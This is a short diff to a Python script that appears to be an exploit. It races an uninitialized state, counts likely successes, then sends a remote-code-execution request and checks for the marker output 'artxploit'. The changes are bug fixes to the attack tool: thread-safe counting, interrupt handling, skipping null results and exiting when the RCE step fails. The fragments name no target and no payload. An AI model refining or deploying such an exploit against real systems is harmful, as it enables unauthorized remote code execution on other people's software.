@@ -64,7 +64,8 @@ def race_worker(password: str, timeout: int):
 
         elapsed = time.perf_counter() - started
         if initialized == False:
-            POSSIBLE_EXPLOIT_SUCCESS_COUNTER += 1
+            with COUNTER_LOCK:
+                POSSIBLE_EXPLOIT_SUCCESS_COUNTER += 1
 
         return {
             "ok": True,
@@ -247,7 +248,7 @@ def main(args):
                 thread_results.append(future.result())
 
     except KeyboardInterrupt:
-        EXPLOIT_SUCCESS_TRIGGER = True
+        MONITOR_STOP.set()
 
     finally:
         MONITOR_STOP.set()
@@ -265,6 +266,7 @@ def main(args):
         init = r.get("initialized", "")
         if init == "": continue
         if init == True: continue
+        if init == None: continue
         init_false += 1
 
     if init_false == 0:
@@ -317,6 +319,7 @@ def main(args):
         rce_json = rce.json()
     except Exception as e:
         print(f"[-] RCE failed: {e}")
+        return
 
     if rce_json.get("output") == "artxploit\n":
         print("[+] Exploit success.")
